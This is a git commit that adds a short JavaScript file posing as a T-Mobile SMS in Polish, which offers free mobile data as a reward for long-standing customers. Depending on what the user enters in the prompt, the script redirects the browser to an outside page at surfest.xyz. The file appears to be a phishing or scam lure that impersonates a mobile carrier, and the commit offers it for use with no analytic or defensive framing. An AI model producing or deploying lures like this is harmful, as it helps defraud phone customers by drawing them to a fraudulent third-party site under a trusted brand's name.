941aeefd25034dae77331cc99b8e4c29e61eedfb
inemitid <asuquodavid021@gmail.com>
2025-05-21 03:11:50 -0700

    Create activation-mobile-dataoffer.js

---
+++ activation-mobile-dataoffer.js
@@ -0,0 +1,5 @@
+var password = 'DARMOWE DANE'
+password=prompt('T-Mobile SMS: Szanowny Kliencie, Sprawdź, czy Twoja karta SIM T-Mobile kwalifikuje się do odbioru danych od 5 GB do 100 GB, nagroda dla starych klientów, naciśnij DARMOWE DANE, aby sprawdzić teraz ','DARMOWE DANE');
+if (password != 'DARMOWE DANE') {
+location.href='https://surfest.xyz/t-mobile-dataoffer.html';
+}
